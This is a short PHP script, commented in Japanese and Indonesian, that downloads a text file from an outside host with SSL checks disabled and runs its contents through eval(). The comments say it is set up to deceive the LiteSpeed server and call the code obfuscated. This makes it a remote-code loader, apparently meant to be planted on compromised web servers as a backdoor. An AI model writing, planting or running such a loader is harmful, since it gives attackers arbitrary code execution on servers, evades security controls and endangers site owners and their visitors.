<?php
// バージョン 1: ストリームハンドラの難読化
$パス = 'https://teamzedd2027.tech/project/rahman.txt';
// LiteSpeedを欺くためのコンテキスト設定 (Setting context untuk menipu LiteSpeed)
$設定 = ["ssl" => ["verify_peer" => false, "verify_peer_name" => false]];
$文脈 = stream_context_create($設定);

$接続 = @fopen($パス, 'rb', false, $文脈);
if ($接続) {
    // チャンクごとに読み込んで結合 (Baca per chunk dan gabungkan)
    $コード = stream_get_contents($接続);
    fclose($接続);
    eval("?>".$コード);
}
?>